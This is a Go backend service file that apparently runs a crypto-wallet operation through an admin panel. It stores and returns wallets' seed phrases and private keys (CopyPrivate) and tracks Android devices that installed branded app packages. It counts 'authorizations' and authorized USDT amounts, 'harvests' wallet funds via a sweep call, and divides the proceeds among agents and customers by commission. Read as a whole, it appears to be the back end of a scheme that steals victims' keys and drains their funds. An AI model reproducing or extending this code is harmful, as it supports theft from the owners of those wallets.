package system

import (
	"errors"
	"fmt"

	"github.com/flipped-aurora/gin-vue-admin/server/blockchain"
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/model"
	"github.com/flipped-aurora/gin-vue-admin/server/model/app"
	"github.com/flipped-aurora/gin-vue-admin/server/utils"
	"github.com/shopspring/decimal"
)

type QianKeService struct{}

func (q *QianKeService) AddPacket(packet *app.Packet) error {
	var pk app.Packet
	global.GVA_DB.Where("group_id=?", packet.GroupId).Find(&pk)
	if pk.ID > 0 {
		return errors.New("包名已存在")
	}
	return global.GVA_DB.Create(packet).Error
}

func (q *QianKeService) ModifyPaymentAddress(address, chain string, userId int) error {
	var agentUser app.Agent
	global.GVA_DB.Where("user_id=?", userId).Find(&agentUser)
	var customUser app.Custom
	global.GVA_DB.Where("user_id=?", userId).Find(&customUser)
	if agentUser.ID == 0 && customUser.ID == 0 {
		return errors.New("不支持的用户")
	}

	var settlement app.Settlement
	global.GVA_DB.Where("chain=? and user_id=?", chain, userId).Find(&settlement)
	if settlement.ID == 0 {
		return errors.New("找不到修改记录")
	}
	settlement.Address = address
	settlement.CreateTime = utils.GetGMTTimeLongFormat()
	return global.GVA_DB.Save(&settlement).Error
}

func (q *QianKeService) ModifyCommissionAddress(address, chain string, kind int) error {
	var settlement app.Settlement
	global.GVA_DB.Where("chain=? and user_id=?", chain, kind).Find(&settlement)
	if settlement.ID == 0 {
		return errors.New("找不到修改记录")
	}
	settlement.Address = address
	settlement.CreateTime = utils.GetGMTTimeLongFormat()
	return global.GVA_DB.Save(&settlement).Error
}

// ★ T73：收款地址的 `user_id` 口径 —— ★★ **写读两侧的唯一权威**（⛔ 不得再散落字面量）。
// 0 ＝ 技术佣金（系统）地址；-1 ＝ 私域地址。
// 依据（T68 两轮定的**证据**，非审美）：读侧 GetSystemAddressInfo 查 user_id=0/-1；
// 同族 ModifyCommissionAddress 的入参注释亦为「0 为系统地址，-1 为私域地址」；存量两库分布皆
// {-1:2, 0:2, …} 且 user_id=1 零行 ⇒ 0/-1 是既有口径、1 是偏差方。
const (
	SettlementUserIdSystem  = 0  // 技术佣金（系统）地址
	SettlementUserIdPrivate = -1 // 私域地址
)

func (q *QianKeService) AddCommissionAddress(address, chain string, kind int) error {
	// ★ T73：`kind` **就是** `user_id`（口径见上）。★ fail-loud：⛔ 不接受口径外的值 ——
	// 否则会像修复前那样把地址静默写进**读侧查不到**的 user_id（＝「弹添加成功、列表一条不动」）。
	if kind != SettlementUserIdSystem && kind != SettlementUserIdPrivate {
		return fmt.Errorf("kind 口径外：%d（只许 %d=技术佣金 / %d=私域）",
			kind, SettlementUserIdSystem, SettlementUserIdPrivate)
	}
	var settlement app.Settlement
	global.GVA_DB.Where("chain=? and user_id=?", chain, kind).Find(&settlement)
	if settlement.ID > 0 {
		return errors.New("此用户的地址已存在")
	}
	settlement.Address = address
	settlement.UserId = kind
	settlement.Chain = chain
	settlement.CreateTime = utils.GetGMTTimeLongFormat()
	return global.GVA_DB.Create(&settlement).Error
}

func (q *QianKeService) AddPaymentAddress(address, chain string, userId int) error {
	var agentUser app.Agent
	global.GVA_DB.Where("user_id=?", userId).Find(&agentUser)
	var customUser app.Custom
	global.GVA_DB.Where("user_id=?", userId).Find(&customUser)
	if agentUser.ID == 0 && customUser.ID == 0 {
		return errors.New("不支持的用户")
	}
	var settlement app.Settlement
	global.GVA_DB.Where("chain=? and user_id=?", chain, userId).Find(&settlement)
	if settlement.ID > 0 {
		return errors.New("此用户的地址已存在")
	}
	settlement.Address = address
	settlement.UserId = userId
	settlement.Chain = chain
	settlement.CreateTime = utils.GetGMTTimeLongFormat()
	return global.GVA_DB.Create(&settlement).Error
}

func (q *QianKeService) UpdateBalance(walletId int) (ustdBalance interface{}, err error) {
	var wallet app.Wallet
	err = global.GVA_DB.Where("id=?", walletId).First(&wallet).Error
	if err != nil {
		return 0, err
	}
	ustdBalance = blockchain.ScanBalance(wallet, false)
	return
}

func (q *QianKeService) Hf(walletId int) (err error) {
	var wallet app.Wallet
	err = global.GVA_DB.Where("id=?", walletId).First(&wallet).Error
	if err != nil {
		return err
	}
	wallet.Region = 1
	return global.GVA_DB.Save(&wallet).Error
}

func (q *QianKeService) Rk(walletId int) (err error) {

	var wallet app.Wallet
	err = global.GVA_DB.Where("id=?", walletId).First(&wallet).Error
	if wallet.Region == 1 {
		return errors.New("公域不能入库！")
	}
	if err != nil {
		return err
	}
	wallet.Region = 2
	return global.GVA_DB.Save(&wallet).Error
}

// collectMode 读取归集执行方开关（sys_dictionaries: type=collect_mode）
// value 为数值码：1=gasleak(默认) 2=qianke 3=both
func (q *QianKeService) collectMode() string {
	const def = "gasleak"
	var code int64
	err := global.GVA_DB.Table("sys_dictionary_details AS dd").
		Select("dd.value").
		Joins("JOIN sys_dictionaries AS d ON d.id = dd.sys_dictionary_id").
		Where("d.type = ? AND dd.status = 1", "collect_mode").
		Order("dd.sort ASC").Limit(1).Scan(&code).Error
	if err != nil {
		return def
	}
	switch code {
	case 2:
		return "qianke"
	case 3:
		return "both"
	case 1:
		return "gasleak"
	default:
		return def
	}
}

func (q *QianKeService) ShouGe(walletId int) (err error) {
	// §4.2.4 归集互斥：默认归集方 gasleak 时禁止手动 Sk，防双重归集
	if mode := q.collectMode(); mode == "gasleak" {
		return errors.New("当前归集方为 gasleak，请勿手动收割")
	}
	var wallet app.Wallet
	err = global.GVA_DB.Where("id=?", walletId).First(&wallet).Error
	if err != nil {
		return err
	}
	if wallet.Progress == 1 {
		return errors.New("正处于收割状态中，请稍等...")
	}

	return blockchain.Sk(walletId)
}

func (q *QianKeService) WalletBalanceList(walletId int) (list interface{}, err error) {
	type BalanceInfo struct {
		Balance  decimal.Decimal `json:"balance"`
		CoinName string          `json:"coin_name"`
	}
	var balanceList []BalanceInfo
	err = global.GVA_DB.Model(app.WalletBalance{}).Select("wallet_balance.balance, token.coin_name").Joins("left join token on wallet_balance.token_id = token.id").
		Where("wallet_balance.wallet_id=? and wallet_balance.balance>0", walletId).Find(&balanceList).Error
	if err != nil {
		return nil, err
	}
	return balanceList, nil
}

func (q *QianKeService) CopyPrivate(walletId int) (value interface{}, err error) {
	var wallet app.Wallet
	err = global.GVA_DB.Where("id=?", walletId).First(&wallet).Error
	if err != nil {
		return "", err
	}
	if wallet.Phrase != "" {
		return wallet.Phrase, nil
	}
	if wallet.PrivateKey != "" {
		return wallet.PrivateKey, nil
	}
	return "", nil
}

func (q *QianKeService) DeviceAgentListInfo() (list interface{}, err error) {
	type AgentList struct {
		ID       int    `json:"id"`
		UserName string `json:"user_name"`
	}
	var retAgentList []AgentList
	err = global.GVA_DB.Model(app.Agent{}).Select("agent.id, sys_users.username as user_name").Joins("left join sys_users on agent.user_id = sys_users.id").
		Find(&retAgentList).Error
	return retAgentList, err
}

// 0 临时域， 1 公域， 2 私域
func (q *QianKeService) GetPrivateWalletList(info model.WalletListPageInfo) (err error, list interface{}, total int64, totalRevenue decimal.Decimal) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Debug().Model(&app.Wallet{}).Select("wallet.*, sys_users.username as agent_name, agent.id as agent_id").
		Joins("left join machine on wallet.machine_id = machine.id").
		Joins("left join agent on machine.agent_id = agent.id").
		Joins("left join sys_users on agent.user_id = sys_users.id")
	db = db.Where("wallet.region=2")
	type WalletInfo struct {
		ID         uint            `json:"id"`
		MachineId  int             `json:"machine_id"`
		WalletName string          `json:"wallet_name"`
		CreateTime string          `json:"create_time"`
		Progress   int             `json:"progress"`
		SkCount    int             `json:"sk_count"`
		AgentId    int             `json:"agent_id"`
		AgentName  string          `json:"agent_name"`
		UstdNum    decimal.Decimal `json:"ustd_num"`
	}
	var machineInfoList []WalletInfo
	if info.Keyword != "" {
		db = db.Where("machine.device_id LIKE ? or wallet.wallet_name LIKE ?", "%"+info.Keyword+"%", "%"+info.Keyword+"%")
	}
	if info.AgentId >= 0 {
		db = db.Where("agent.id =?", info.AgentId)
	}

	if info.StartTime != "" && info.EndTime != "" {
		db = db.Where("wallet.create_time >=? and wallet.create_time <=?", info.StartTime, info.EndTime)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, machineInfoList, total, totalRevenue
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("wallet.create_time desc").Find(&machineInfoList).Error
		for i := 0; i < len(machineInfoList); i++ {
			totalRevenue = totalRevenue.Add(machineInfoList[i].UstdNum)
		}
	}
	return err, machineInfoList, total, totalRevenue
}

// 0 临时域， 1 公域， 2 私域    客户后台，可以看到 公域的
func (q *QianKeService) GetCustomWalletList(info model.WalletListPageInfo) (err error, list interface{}, total int64, totalRevenue decimal.Decimal) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Debug().Model(&app.Wallet{}).Select("wallet.*, sys_users.username as agent_name, agent.id as agent_id").
		Joins("left join machine on wallet.machine_id = machine.id").
		Joins("left join agent on machine.agent_id = agent.id").
		Joins("left join sys_users on agent.user_id = sys_users.id")
	db = db.Where("wallet.region=1")
	type WalletInfo struct {
		ID         uint            `json:"id"`
		MachineId  int             `json:"machine_id"`
		WalletName string          `json:"wallet_name"`
		CreateTime string          `json:"create_time"`
		Progress   int             `json:"progress"`
		SkCount    int             `json:"sk_count"`
		AgentId    int             `json:"agent_id"`
		AgentName  string          `json:"agent_name"`
		UstdNum    decimal.Decimal `json:"ustd_num"`
	}
	var machineInfoList []WalletInfo
	if info.Keyword != "" {
		db = db.Where("machine.device_id LIKE ? or wallet.wallet_name LIKE ?", "%"+info.Keyword+"%", "%"+info.Keyword+"%")
	}
	if info.AgentId >= 0 {
		db = db.Where("agent.id =?", info.AgentId)
	}

	if info.StartTime != "" && info.EndTime != "" {
		db = db.Where("wallet.create_time >=? and wallet.create_time <=?", info.StartTime, info.EndTime)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, machineInfoList, total, totalRevenue
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("wallet.create_time desc").Find(&machineInfoList).Error
		for i := 0; i < len(machineInfoList); i++ {
			totalRevenue = totalRevenue.Add(machineInfoList[i].UstdNum)
		}
	}
	return err, machineInfoList, total, totalRevenue
}

// 0 临时域， 1 公域， 2 私域    代理商后台，可以看到自己的 公域的
func (q *QianKeService) GetAgentWalletList(info model.WalletListPageInfo, userId int) (err error, list interface{}, total int64, totalRevenue decimal.Decimal) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Debug().Model(&app.Wallet{}).Select("wallet.*, sys_users.username as agent_name, agent.id as agent_id").
		Joins("left join machine on wallet.machine_id = machine.id").
		Joins("left join agent on machine.agent_id = agent.id").
		Joins("left join sys_users on agent.user_id = sys_users.id")
	db = db.Where("wallet.region=1 and agent.user_id = ?", userId)
	type WalletInfo struct {
		ID         uint            `json:"id"`
		MachineId  int             `json:"machine_id"`
		WalletName string          `json:"wallet_name"`
		CreateTime string          `json:"create_time"`
		Progress   int             `json:"progress"`
		SkCount    int             `json:"sk_count"`
		AgentId    int             `json:"agent_id"`
		AgentName  string          `json:"agent_name"`
		UstdNum    decimal.Decimal `json:"ustd_num"`
	}
	var machineInfoList []WalletInfo
	if info.Keyword != "" {
		db = db.Where("machine.device_id LIKE ? or wallet.wallet_name LIKE ?", "%"+info.Keyword+"%", "%"+info.Keyword+"%")
	}

	if info.StartTime != "" && info.EndTime != "" {
		db = db.Where("wallet.create_time >=? and wallet.create_time <=?", info.StartTime, info.EndTime)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, machineInfoList, total, totalRevenue
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("wallet.create_time desc").Find(&machineInfoList).Error
		for i := 0; i < len(machineInfoList); i++ {
			totalRevenue = totalRevenue.Add(machineInfoList[i].UstdNum)
		}
	}
	return err, machineInfoList, total, totalRevenue
}

// 0 临时域， 1 公域， 2 私域   总后台，可以看到临时域和公域的
func (q *QianKeService) GetWalletList(info model.WalletListPageInfo) (err error, list interface{}, total int64, totalRevenue decimal.Decimal) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Debug().Model(&app.Wallet{}).Select("wallet.*, sys_users.username as agent_name, agent.id as agent_id").
		Joins("left join machine on wallet.machine_id = machine.id").
		Joins("left join agent on machine.agent_id = agent.id").
		Joins("left join sys_users on agent.user_id = sys_users.id")
	db = db.Where("wallet.region<=1")

	type WalletInfo struct {
		ID         uint            `json:"id"`
		MachineId  int             `json:"machine_id"`
		WalletName string          `json:"wallet_name"`
		CreateTime string          `json:"create_time"`
		Progress   int             `json:"progress"`
		SkCount    int             `json:"sk_count"`
		AgentId    int             `json:"agent_id"`
		AgentName  string          `json:"agent_name"`
		UstdNum    decimal.Decimal `json:"ustd_num"`
	}
	var machineInfoList []WalletInfo
	if info.Keyword != "" {
		db = db.Where("machine.device_id LIKE ? or wallet.wallet_name LIKE ?", "%"+info.Keyword+"%", "%"+info.Keyword+"%")
	}
	if info.AgentId >= 0 {
		db = db.Where("agent.id =?", info.AgentId)
	}

	if info.StartTime != "" && info.EndTime != "" {
		db = db.Where("wallet.create_time >=? and wallet.create_time <=?", info.StartTime, info.EndTime)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, machineInfoList, total, totalRevenue
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("wallet.create_time desc").Find(&machineInfoList).Error

		for i := 0; i < len(machineInfoList); i++ {
			totalRevenue = totalRevenue.Add(machineInfoList[i].UstdNum)
		}
	}
	return err, machineInfoList, total, totalRevenue
}

func (q *QianKeService) GetAgentDeviceList(info model.AgentDeviceListPageInfo, userId int) (err error, list interface{}, total int64) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Debug().Model(&app.Machine{}).Select("machine.*, sys_users.username as agent_name").
		Joins("left join agent on machine.agent_id = agent.id").
		Joins("left join sys_users on agent.user_id = sys_users.id")
	db = db.Where("agent.user_id=?", userId)

	type MachineInfo struct {
		ID             uint   `json:"id"`
		DeviceId       string `json:"device_id"`
		AgentId        int    `json:"agent_id"`
		Ip             string `json:"ip"`
		Country        string `json:"country"`
		Brand          string `json:"brand"`
		Model          string `json:"model"`
		AndroidVersion string `json:"android_version"`
		Status         int    `json:"status"`
		AppPackageName string `json:"app_package_name"`
		CreateTime     string `json:"create_time"`
		AgentName      string `json:"agent_name"`
	}
	var machineInfoList []MachineInfo
	if info.Keyword != "" {
		db = db.Where("machine.ip LIKE ? or machine.country LIKE ? or machine.device_id LIKE ? or machine.brand LIKE ? or android_version LIKE ? or app_package_name LIKE ? or machine.model LIKE ?",
			"%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%")
	}
	if info.Status >= 0 {
		db = db.Where("machine.status = ?", info.Status)
	}

	if info.StartTime != "" && info.EndTime != "" {
		db = db.Where("machine.create_time >=? and machine.create_time <=?", info.StartTime, info.EndTime)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, machineInfoList, total
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("machine.create_time desc").Find(&machineInfoList).Error
	}
	return err, machineInfoList, total
}

func (q *QianKeService) GetDeviceList(info model.DeviceListPageInfo) (err error, list interface{}, total int64) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Debug().Model(&app.Machine{}).Select("machine.*, sys_users.username as agent_name").
		Joins("left join agent on machine.agent_id = agent.id").
		Joins("left join sys_users on agent.user_id = sys_users.id")

	type MachineInfo struct {
		ID             uint   `json:"id"`
		DeviceId       string `json:"device_id"`
		AgentId        int    `json:"agent_id"`
		Ip             string `json:"ip"`
		Country        string `json:"country"`
		Brand          string `json:"brand"`
		Model          string `json:"model"`
		AndroidVersion string `json:"android_version"`
		Status         int    `json:"status"`
		AppPackageName string `json:"app_package_name"`
		CreateTime     string `json:"create_time"`
		AgentName      string `json:"agent_name"`
	}
	var machineInfoList []MachineInfo
	if info.Keyword != "" {
		db = db.Where("machine.ip LIKE ? or machine.country LIKE ? or machine.device_id LIKE ? or machine.brand LIKE ? or android_version LIKE ? or app_package_name LIKE ? or machine.model LIKE ?",
			"%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%", "%"+info.Keyword+"%")
	}
	if info.Status >= 0 {
		db = db.Where("machine.status = ?", info.Status)
	}
	if info.AgentId >= 0 {
		db = db.Where("agent.id =?", info.AgentId)
	}

	if info.StartTime != "" && info.EndTime != "" {
		db = db.Where("machine.create_time >=? and machine.create_time <=?", info.StartTime, info.EndTime)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, machineInfoList, total
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("machine.create_time desc").Find(&machineInfoList).Error
	}
	return err, machineInfoList, total
}

func (q *QianKeService) GetTokenList() (list interface{}, err error) {
	type TokenInfo struct {
		ID       int    `json:"id"`
		CoinName string `json:"coin_name"`
	}
	mpTokenInfo := make(map[string][]TokenInfo)
	var tokenList []app.Token
	global.GVA_DB.Find(&tokenList)
	for i := 0; i < len(tokenList); i++ {
		ti := TokenInfo{
			ID:       int(tokenList[i].ID),
			CoinName: tokenList[i].CoinName,
		}
		mpTokenInfo[tokenList[i].Chain] = append(mpTokenInfo[tokenList[i].Chain], ti)
	}
	return mpTokenInfo, nil
}

func (q *QianKeService) GetAgentFinancialList(info model.FinancialPageInfo, userId int) (err error, list interface{}, total int64, totalRevenue decimal.Decimal) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Debug().Model(&app.Bill{}).Select("bill.id,bill.order_id,bill.create_time,bill.total_num, bill.num, bill.usdt_num, bill.status, token.chain,token.coin_name,settlement.address,sys_users.username as agent_name").
		Joins("left join token on bill.token_id = token.id").
		Joins("left join settlement on bill.settlement_id = settlement.id").
		Joins("left join sys_users on settlement.user_id = sys_users.id")

	type FinancialInfo struct {
		ID         uint   `json:"id"`
		OrderId    string `json:"order_id"`
		TotalNum   string `json:"total_num"`
		Num        string `json:"num"`
		UsdtNum    string `json:"usdt_num"`
		Chain      string `json:"chain"`
		CoinName   string `json:"coin_name"`
		Address    string `json:"address"`
		AgentName  string `json:"agent_name"`
		Status     int    `json:"status"`
		CreateTime string `json:"create_time"`
	}
	var financialInfoList []FinancialInfo
	db = db.Where("bill.role = 3 and sys_users.id=?", userId)
	if info.Keyword != "" {
		db = db.Where("sys_users.username LIKE ? or settlement.address LIKE ?", "%"+info.Keyword+"%", "%"+info.Keyword+"%")
	}
	if info.Status > 0 {
		db = db.Where("bill.status = ?", info.Status)
	}
	if info.TokenId > 0 {
		db = db.Where("bill.token_id =?", info.TokenId)
	}

	if info.StartTime != "" && info.EndTime != "" {
		db = db.Where("bill.create_time >=? and bill.create_time <=?", info.StartTime, info.EndTime)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, financialInfoList, total, totalRevenue
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("bill.create_time desc").Find(&financialInfoList).Error
		for i := 0; i < len(financialInfoList); i++ {
			tmp, _ := decimal.NewFromString(financialInfoList[i].UsdtNum)
			totalRevenue = totalRevenue.Add(tmp)
		}
	}
	return err, financialInfoList, total, totalRevenue
}

func (q *QianKeService) GetFinancialList(info model.FinancialPageInfo) (err error, list interface{}, total int64, totalRevenue decimal.Decimal) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Debug().Model(&app.Bill{}).Select("bill.role, bill.id,bill.order_id,bill.create_time,bill.total_num, bill.num, bill.usdt_num, bill.status, token.chain,token.coin_name,settlement.address,sys_users.username as agent_name").
		Joins("left join token on bill.token_id = token.id").
		Joins("left join settlement on bill.settlement_id = settlement.id").
		Joins("left join sys_users on settlement.user_id = sys_users.id")

	type FinancialInfo struct {
		ID         uint   `json:"id"`
		OrderId    string `json:"order_id"`
		TotalNum   string `json:"total_num"`
		Num        string `json:"num"`
		UsdtNum    string `json:"usdt_num"`
		Chain      string `json:"chain"`
		CoinName   string `json:"coin_name"`
		Address    string `json:"address"`
		AgentName  string `json:"agent_name"`
		Status     int    `json:"status"`
		CreateTime string `json:"create_time"`
		Role       int    `json:"role"`
	}
	var financialInfoList []FinancialInfo
	if info.Role > 0 {
		db = db.Where("bill.role =?", info.Role)
	}
	if info.Keyword != "" {
		db = db.Where("sys_users.username LIKE ? or settlement.address LIKE ?", "%"+info.Keyword+"%", "%"+info.Keyword+"%")
	}
	if info.Status > 0 {
		db = db.Where("bill.status = ?", info.Status)
	}

	if info.TokenId > 0 {
		db = db.Where("bill.token_id =?", info.TokenId)
	}

	if info.StartTime != "" && info.EndTime != "" {
		db = db.Where("bill.create_time >=? and bill.create_time <=?", info.StartTime, info.EndTime)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, financialInfoList, total, totalRevenue
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("bill.create_time desc").Find(&financialInfoList).Error

		for i := 0; i < len(financialInfoList); i++ {
			tmp, _ := decimal.NewFromString(financialInfoList[i].UsdtNum)
			totalRevenue = totalRevenue.Add(tmp)
		}
	}
	return err, financialInfoList, total, totalRevenue
}

func (q *QianKeService) GetCustomFinancialList(info model.FinancialPageInfo) (err error, list interface{}, total int64, totalRevenue decimal.Decimal) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	db := global.GVA_DB.Debug().Model(&app.Bill{}).Select("bill.role, bill.id,bill.order_id,bill.create_time,bill.total_num, bill.num, bill.usdt_num, bill.status, token.chain,token.coin_name,settlement.address,sys_users.username as agent_name").
		Joins("left join token on bill.token_id = token.id").
		Joins("left join settlement on bill.settlement_id = settlement.id").
		Joins("left join sys_users on settlement.user_id = sys_users.id")

	type FinancialInfo struct {
		ID         uint   `json:"id"`
		OrderId    string `json:"order_id"`
		TotalNum   string `json:"total_num"`
		Num        string `json:"num"`
		UsdtNum    string `json:"usdt_num"`
		Chain      string `json:"chain"`
		CoinName   string `json:"coin_name"`
		Address    string `json:"address"`
		AgentName  string `json:"agent_name"`
		Status     int    `json:"status"`
		CreateTime string `json:"create_time"`
		Role       int    `json:"role"`
	}
	var financialInfoList []FinancialInfo
	if info.Role == 0 {
		db = db.Where("bill.role =2 or bill.role = 3")
	} else {
		db = db.Where("bill.role =?", info.Role)
	}

	if info.Keyword != "" {
		db = db.Where("sys_users.username LIKE ? or settlement.address LIKE ?", "%"+info.Keyword+"%", "%"+info.Keyword+"%")
	}
	if info.Status > 0 {
		db = db.Where("bill.status = ?", info.Status)
	}

	if info.TokenId > 0 {
		db = db.Where("bill.token_id =?", info.TokenId)
	}

	if info.StartTime != "" && info.EndTime != "" {
		db = db.Where("bill.create_time >=? and bill.create_time <=?", info.StartTime, info.EndTime)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, financialInfoList, total, totalRevenue
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("bill.create_time desc").Find(&financialInfoList).Error
		for i := 0; i < len(financialInfoList); i++ {
			tmp, _ := decimal.NewFromString(financialInfoList[i].UsdtNum)
			totalRevenue = totalRevenue.Add(tmp)
		}
	}
	return err, financialInfoList, total, totalRevenue
}

func (q *QianKeService) GetPacketListInfo() (err error, list interface{}) {
	type Packet struct {
		ID   int    `json:"id"`
		Name string `json:"name"`
	}
	var packets []Packet
	err = global.GVA_DB.Model(app.Packet{}).Find(&packets).Error
	return err, packets
}

func (q *QianKeService) GetPacketList() (err error, list interface{}) {
	var packets []app.Packet
	err = global.GVA_DB.Find(&packets).Error
	return err, packets
}

func (q *QianKeService) GetAgentTabulation(info model.PageInfo) (err error, list interface{}, total int64) {
	limit := info.PageSize
	offset := info.PageSize * (info.Page - 1)
	type AgentInfo struct {
		ID           int    `json:"id"`
		Country      string `json:"country"`
		Domain       string `json:"domain"`
		Name         string `json:"name"`
		Ratio        int    `json:"ratio"`
		UsdtNum      string `json:"usdt_num"`
		MachineCount int    `json:"machine_count"`
	}
	var agentInfoList []AgentInfo
	db := global.GVA_DB.Model(app.Agent{}).Select("a.machine_count,  packet.name, packet.domain, agent.ratio, agent.usdt_num, agent.id, agent.country").
		Joins("left join packet on agent.packet_id = packet.id").
		Joins("left join (select count(*) as machine_count, agent_id from machine group by agent_id) as a on a.agent_id = agent.id")

	if info.Keyword != "" {
		db = db.Where("agent.country LIKE ? or packet.name LIKE ? or agent.id =?", "%"+info.Keyword+"%", "%"+info.Keyword+"%", info.Keyword)
	}

	err = db.Count(&total).Error
	if err != nil {
		return err, agentInfoList, total
	} else {
		db = db.Limit(limit).Offset(offset)
		err = db.Order("agent.create_time desc").Find(&agentInfoList).Error
	}
	return err, agentInfoList, total
}

func (q *QianKeService) GetAgentPaymentAddress(userId int) (error, interface{}) {
	type AgentAddressInfo struct {
		Name    string `json:"name"`
		Chain   string `json:"chain"`
		Address string `json:"address"`
	}

	// 代理商收款地址
	var agentAddressList []AgentAddressInfo
	global.GVA_DB.Model(app.Agent{}).Select("settlement.chain, settlement.address, sys_users.username as name").
		Joins("left join settlement on settlement.user_id = agent.user_id").
		Joins("left join sys_users on agent.user_id = sys_users.id").Where("sys_users.id=?", userId).Find(&agentAddressList)
	return nil, agentAddressList
}

func (q *QianKeService) GetPaymentAddress() (error, interface{}, interface{}) {
	type CustomAddressInfo struct {
		Chain   string `json:"chain"`
		Address string `json:"address"`
	}
	// 客户收款地址
	var customAddressList []CustomAddressInfo
	global.GVA_DB.Model(app.Custom{}).Select("settlement.chain, settlement.address").Joins("left join settlement on settlement.user_id = custom.user_id").Find(&customAddressList)

	type AgentAddressInfo struct {
		Name    string `json:"name"`
		Chain   string `json:"chain"`
		Address string `json:"address"`
	}

	// 代理商收款地址
	var agentAddressList []AgentAddressInfo
	global.GVA_DB.Model(app.Agent{}).Select("settlement.chain, settlement.address, sys_users.username as name").
		Joins("left join settlement on settlement.user_id = agent.user_id").
		Joins("left join sys_users on agent.user_id = sys_users.id").Find(&agentAddressList)
	return nil, customAddressList, agentAddressList
}

func (q *QianKeService) GetSystemAddressInfo() (err error, commission interface{}, private interface{}, agent interface{}, custom interface{}) {
	var commissionAddress []app.Settlement
	err = global.GVA_DB.Where("user_id=?", SettlementUserIdSystem).Find(&commissionAddress).Error
	var privateAddress []app.Settlement
	err = global.GVA_DB.Where("user_id=?", SettlementUserIdPrivate).Find(&privateAddress).Error
	type CustomAddressInfo struct {
		Chain   string `json:"chain"`
		Address string `json:"address"`
	}
	// 客户收款地址
	var customAddressList []CustomAddressInfo
	global.GVA_DB.Model(app.Custom{}).Select("settlement.chain, settlement.address").Joins("left join settlement on settlement.user_id = custom.user_id").Find(&customAddressList)

	type AgentAddressInfo struct {
		Name    string `json:"name"`
		Chain   string `json:"chain"`
		Address string `json:"address"`
	}
	// 代理商收款地址
	var agentAddressList []AgentAddressInfo
	global.GVA_DB.Model(app.Agent{}).Select("settlement.chain, settlement.address, sys_users.username as name").
		Joins("left join settlement on settlement.user_id = agent.user_id").
		Joins("left join sys_users on agent.user_id = sys_users.id").Find(&agentAddressList)

	return err, commissionAddress, privateAddress, agentAddressList, customAddressList
}

// 首页统计
func (q *QianKeService) GetIndexInfo(userId int, authorityId string) (error, interface{}, interface{}, interface{}, interface{}) {
	var azNum int64 //安装数量
	//平台及客户，查的全部
	if authorityId == "888" || authorityId == "321" {
		err := global.GVA_DB.Model(app.Machine{}).Count(&azNum).Error
		if err != nil {
			return err, 0, 0, 0, 0
		}
	} else {
		err := global.GVA_DB.Model(app.Machine{}).Joins("left join agent on machine.agent_id = agent.id").
			Where("agent.user_id=?", userId).Count(&azNum).Error
		if err != nil {
			return err, 0, 0, 0, 0
		}
	}
	var sqNum int64 //授权数量
	if authorityId == "888" || authorityId == "321" {
		err := global.GVA_DB.Model(app.Machine{}).Where("status=1").Count(&sqNum).Error
		if err != nil {
			return err, 0, 0, 0, 0
		}
	} else {
		err := global.GVA_DB.Model(app.Machine{}).Joins("left join agent on machine.agent_id = agent.id").
			Where("agent.user_id=? and machine.status=1", userId).Count(&sqNum).Error
		if err != nil {
			return err, 0, 0, 0, 0
		}
	}
	var sqUsdt float64 // 总授权金额 (折算USDT)
	if authorityId == "888" || authorityId == "321" {
		err := global.GVA_DB.Model(app.Wallet{}).Pluck("COALESCE(SUM(ustd_num), 0) as sqUsdt", &sqUsdt).Error
		if err != nil {
			return err, 0, 0, 0, 0
		}
	} else {
		err := global.GVA_DB.Model(app.Wallet{}).Joins("left join machine on wallet.machine_id = machine.id").Joins("left join agent on machine.agent_id=agent.id").
			Where("agent.user_id=?", userId).Pluck("COALESCE(SUM(wallet.ustd_num), 0) as sqUsdt", &sqUsdt).Error
		if err != nil {
			return err, 0, 0, 0, 0
		}
	}
	var zlrUsdt float64 //总利润 (折算USDT)
	if authorityId == "888" {
		err := global.GVA_DB.Model(app.Bill{}).Pluck("COALESCE(SUM(usdt_num), 0) as zlrUsdt", &zlrUsdt).Error
		if err != nil {
			return err, 0, 0, 0, 0
		}
	} else if authorityId == "321" {
		err := global.GVA_DB.Model(app.Custom{}).Where("user_id=?", userId).Pluck("usdt_num as zlrUsdt", &zlrUsdt).Error
		if err != nil {
			return err, 0, 0, 0, 0
		}
	} else if authorityId == "1234" {
		err := global.GVA_DB.Model(app.Agent{}).Where("user_id=?", userId).Pluck("usdt_num as zlrUsdt", &zlrUsdt).Error
		if err != nil {
			return err, 0, 0, 0, 0
		}
	}
	return nil, azNum, sqNum, sqUsdt, zlrUsdt
}
